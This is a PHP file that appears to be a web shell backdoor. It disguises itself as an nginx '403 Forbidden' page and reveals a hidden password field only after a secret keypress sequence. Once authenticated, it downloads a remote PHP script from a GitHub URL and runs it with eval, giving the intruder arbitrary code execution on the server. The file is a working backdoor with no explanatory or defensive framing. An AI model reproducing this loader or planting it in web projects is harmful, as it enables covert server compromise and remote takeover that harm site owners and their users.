<?php
$auth_pass = "e783310e3b58edd1d96b72e69fd8755cb11772537ea69598c9ab75c42cd70964";

function Login() {
    die("<html>
    <title>403 Forbidden</title>
    <center><h1>403 Forbidden</h1></center>
    <hr><center>nginx (apache v.168 ./jerry_sys) </center>
    <center>
    <div style='cursor:pointer;'></div>
    <form id='login-form' method='post' style='display:none;'>
        <input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'>
    </form>
    <script>
    let clickCount = 0;
    document.addEventListener('keydown', function(event) {
        if (event.key === '3') {
            clickCount++;
            if (clickCount === 3) {
                document.getElementById('login-form').style.display = 'block';
            }
        } else {
            clickCount = 0;
        }
    });
    </script>
    </center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
function fetchRemoteContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Timeout 10 detik
    $content = curl_exec($ch);
    if (curl_errno($ch)) {
       
        error_log('Error fetching remote content: ' . curl_error($ch));
        curl_close($ch);
        return false;
    }
    curl_close($ch);
    return $content;
}


function is_logged_in() {
    global $auth_pass;
    return isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) && ($_COOKIE[md5($_SERVER['HTTP_HOST'])] == $auth_pass);
}


if (is_logged_in()) {
 
    $a = fetchRemoteContent('https://raw.githubusercontent.com/munz666/scriptshelll/main/anon7.php');
    if ($a !== false) {
        eval('?>' . $a);
    } else {

        die('Failed to fetch remote content.');
    }
} else {
 
    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass)) {
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
    }
    if (!is_logged_in()) {
        Login();
    }
}
?>
